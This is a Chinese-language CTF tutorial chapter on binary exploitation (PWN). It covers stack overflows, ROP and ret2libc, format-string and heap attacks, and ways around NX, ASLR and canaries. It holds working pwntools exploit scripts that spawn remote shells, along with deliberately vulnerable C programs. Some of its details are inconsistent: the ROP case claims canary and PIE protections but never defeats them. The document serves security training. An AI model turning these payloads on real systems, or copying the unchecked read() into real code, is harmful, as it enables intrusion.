# 第三章：PWN题型详解

### 3.1 PWN基础概念

PWN是CTF竞赛中的一类重要题型，主要涉及二进制程序的漏洞利用。这类题目通常提供一个存在漏洞的二进制程序，参赛者需要通过分析程序找到漏洞点并构造EXP实现远程代码执行或获取flag。

#### 3.1.1 PWN题型特点

1. **二进制程序**：通常为ELF格式的可执行文件
2. **漏洞类型**：缓冲区溢出、格式化字符串、堆漏洞等
3. **利用目标**：获取shell、读取flag文件、执行特定函数
4. **防护机制**：可能包含NX、ASLR、Canary、PIE等保护机制

#### 3.1.2 常用工具

1. **静态分析工具**：
   - IDA Pro：强大的反汇编和逆向分析工具
   - Ghidra：NSA开源的逆向工程工具
   - Radare2：开源逆向分析框架

2. **动态调试工具**：
   - GDB：GNU调试器
   - GDB-PEDA：GDB的Python插件扩展
   - pwntools：CTF专用的Python库

3. **漏洞利用工具**：
   - pwntools：提供丰富的漏洞利用函数
   - ROPgadget：ROP链构造工具
   - one_gadget：寻找one-shot gadgets

### 3.2 栈溢出漏洞

#### 3.2.1 漏洞原理

栈溢出是最常见的PWN漏洞类型，当程序向栈上的缓冲区写入数据时，如果未对写入长度进行检查，就可能导致缓冲区溢出，覆盖栈上的其他数据，包括返回地址。

#### 3.2.2 漏洞利用步骤

1. **确定溢出点**：
   - 通过模糊测试确定触发溢出的输入长度
   - 使用模式字符串定位精确的偏移量

2. **绕过防护机制**：
   - 绕过Canary保护
   - 绕过NX保护（ROP/JOP）
   - 绕过ASLR保护（信息泄露）

3. **构造EXP**：
   - 控制程序执行流
   - 执行system("/bin/sh")或execve
   - 读取flag文件

#### 3.2.3 典型EXP示例

```python
from pwn import *

# 连接目标程序
# p = process('./vuln')
p = remote('target.com', 1337)

# 构造payload
payload = b""
payload += b"A" * 72  # 填充到返回地址
payload += p64(0x401123)  # 覆盖返回地址

# 发送payload
p.sendline(payload)

# 交互式shell
p.interactive()
```

#### 3.2.4 ROP技术

当NX保护开启时，栈上数据不可执行，此时需要使用ROP（Return-Oriented Programming）技术。

1. **ROP链构造**：
   ```python
   from pwn import *
   
   # 寻找gadgets
   # ROPgadget --binary ./vuln
   
   # 构造ROP链
   rop = ROP('./vuln')
   rop.call('puts', [elf.got['puts']])
   rop.call('main')
   ```

2. **ret2libc攻击**：
   ```python
   # 泄露libc地址
   payload = b"A" * 72
   payload += p64(pop_rdi)
   payload += p64(puts_got)
   payload += p64(puts_plt)
   payload += p64(main_addr)
   ```

### 3.3 格式化字符串漏洞

#### 3.3.1 漏洞原理

当程序使用如printf、sprintf等格式化函数时，如果格式化字符串参数可控且未正确指定，就可能导致格式化字符串漏洞。

#### 3.3.2 漏洞利用

1. **任意内存读取**：
   ```
   %x %x %x %x  # 泄露栈上数据
   %s  # 泄露指定地址的字符串
   ```

2. **任意内存写入**：
   ```
   %n  # 将已输出字符数写入指定地址
   %hn  # 写入短整型
   %hhn  # 写入字节
   ```

3. **EXP示例**：
   ```python
   from pwn import *
   
   # 泄露栈地址
   payload = b"%10$p"
   p.sendline(payload)
   stack_addr = int(p.recvline().strip(), 16)
   
   # 修改返回地址
   payload = fmtstr_payload(6, {stack_addr+0x40: 0x401123})
   p.sendline(payload)
   ```

### 3.4 堆漏洞利用

#### 3.4.1 堆管理机制

1. **堆分配器**：
   - ptmalloc（glibc默认分配器）
   - jemalloc（FreeBSD默认分配器）
   - tcmalloc（Google开发）

2. **堆块结构**：
   ```c
   struct malloc_chunk {
     size_t      mchunk_prev_size;  /* Size of previous chunk (if free).  */
     size_t      mchunk_size;       /* Size in bytes, including overhead. */
     struct malloc_chunk* fd;       /* double links -- used only if free. */
     struct malloc_chunk* bk;
     /* Only used for large blocks: pointer to next larger size.  */
     struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
     struct malloc_chunk* bk_nextsize;
   };
   ```

#### 3.4.2 常见堆漏洞

1. **Use After Free (UAF)**：
   - 释放后的内存再次使用
   - 可通过伪造对象实现任意代码执行

2. **堆溢出**：
   - 向堆块写入数据时超出边界
   - 可覆盖相邻堆块或元数据

3. **堆风水**：
   - 通过精心构造堆块布局
   - 为后续漏洞利用创造条件

#### 3.4.3 堆漏洞利用技术

1. **Fastbin Attack**：
   ```python
   # 伪造fastbin chunk
   payload = b"A" * 0x20
   payload += p64(0x31)  # chunk size
   payload += p64(fake_chunk_addr - 0x10)  # fd指针
   
   # 触发漏洞获得任意地址写
   add(0x20, payload)
   add(0x20, "fake")  # 分配到fake_chunk_addr
   ```

2. **Unsorted Bin Attack**：
   ```python
   # 修改global_max_fast
   payload = b"A" * 0x90
   payload += p64(0)  # prev_size
   payload += p64(0xa1)  # size
   payload += p64(0)  # fd
   payload += p64(target_addr - 0x10)  # bk
   
   # 触发unsorted bin attack
   free(chunk1)
   add(0x90, payload)
   ```

### 3.5 防护机制绕过

#### 3.5.1 NX保护绕过

1. **ROP技术**：
   - 利用已有的代码片段构造执行链
   - 调用system("/bin/sh")或execve

2. **JOP技术**：
   - Jump-Oriented Programming
   - 利用jmp指令构造执行链

#### 3.5.2 ASLR保护绕过

1. **信息泄露**：
   - 利用格式化字符串漏洞泄露地址
   - 利用堆漏洞泄露堆地址
   - 利用栈漏洞泄露栈地址

2. **部分覆盖**：
   - 利用地址的固定部分减少爆破范围
   - 结合其他漏洞实现精确利用

#### 3.5.3 Canary保护绕过

1. **信息泄露**：
   - 利用格式化字符串漏洞读取canary值
   - 利用其他漏洞获取栈上数据

2. **暴力破解**：
   - 由于canary的低字节为0，只需爆破3字节
   - 在本地环境中可尝试爆破

### 3.6 实战案例分析

#### 3.6.1 简单栈溢出案例

**程序源码**：
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vuln() {
    char buf[64];
    read(0, buf, 0x100);  // 漏洞点：未检查输入长度
    puts(buf);
}

int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    vuln();
    return 0;
}
```

**漏洞分析**：
1. `read(0, buf, 0x100)`存在栈溢出漏洞
2. 无Canary保护，可直接覆盖返回地址
3. 无NX保护，可直接执行shellcode

**EXP构造**：
```python
from pwn import *

# context.log_level = 'debug'
context.arch = 'amd64'

# p = process('./vuln')
p = remote('target.com', 1337)

# shellcode
shellcode = asm(shellcraft.sh())

# 构造payload
payload = b""
payload += shellcode
payload += b"A" * (72 - len(shellcode))  # 填充到返回地址
payload += p64(0x7fffffffe6a0)  # shellcode地址

# 发送payload
p.send(payload)

# 交互式shell
p.interactive()
```

#### 3.6.2 ROP利用案例

**程序源码**：
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vuln() {
    char buf[64];
    read(0, buf, 0x100);
    puts(buf);
}

int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    vuln();
    return 0;
}
```

**安全防护**：
- 开启NX保护
- 开启Canary保护
- 开启PIE保护

**EXP构造**：
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

# p = process('./vuln')
p = remote('target.com', 1337)

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# 泄露libc基地址
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.vuln()

payload = b"A" * 72
payload += p64(0x401123)  # pop rdi; ret
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['vuln'])

p.send(payload)

# 获取libc基地址
puts_addr = u64(p.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 执行system("/bin/sh")
payload = b"A" * 72
payload += p64(0x401123)  # pop rdi; ret
payload += p64(binsh_addr)
payload += p64(system_addr)

p.send(payload)
p.interactive()
```

### 3.7 PWN学习资源推荐

1. **在线练习平台**：
   - Pwnable.kr：经典的PWN练习平台
   - Pwnable.tw：台湾的PWN练习平台
   - BUUCTF：国内CTF练习平台

2. **学习资料**：
   - 《黑客攻防技术宝典：系统实战篇》
   - 《0day安全：软件漏洞分析技术》
   - CTF-Wiki：开源的CTF知识库

3. **工具文档**：
   - pwntools官方文档
   - GDB-PEDA使用手册
   - IDA Pro逆向分析指南